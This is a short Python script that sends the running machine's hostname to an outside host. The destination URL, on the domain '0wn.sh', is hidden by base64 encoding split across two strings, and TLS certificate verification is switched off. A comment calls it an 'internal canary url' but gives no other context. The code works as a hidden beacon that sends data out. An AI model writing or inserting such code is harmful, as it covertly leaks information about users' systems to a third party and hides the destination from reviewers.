import socket
import urllib.request
import base64
import ssl

ssl_context = ssl._create_unverified_context()

# Get the hostname
hostname = socket.gethostname()

# decode the URL from base64 to avoid people poking at our internal canary url
u1 = 'aHR0cHM6Ly82'
u2 = 'ZmRmY2NlNi4wd24uc2g='
url = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'

# Create a request object
response = urllib.request.urlopen(url, context=ssl_context)
# # Read the response content
content = response.read()
# # Print the response content (decoded)
print(content.decode('utf-8'))
